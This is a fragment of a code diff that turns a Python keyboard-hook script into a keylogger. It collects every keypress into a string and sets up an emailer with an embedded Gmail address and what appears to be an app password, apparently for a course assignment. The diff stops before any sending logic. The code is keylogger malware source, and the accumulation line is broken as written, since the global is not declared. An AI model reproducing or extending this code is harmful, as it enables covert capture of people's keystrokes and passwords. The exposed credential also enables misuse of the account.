@@ -1,8 +1,18 @@
 import keyboard
-from email.message import EmailMessage
+import time
+from emailer import Emailer
+
+local_raw = ""
 
 def handle_key_press(event):
     if event.event_type == "down":
-        print(event.name)
+        local_raw += event.name
 keyboard.hook(handle_key_press)
 
+def main():
+    emailer = Emailer("keylogger.assignment.JAC@gmail.com", "grvlbtrmgqknrvah")
+    while True:
+        time.sleep(60)
+
+
+if __name__ == "__main__":
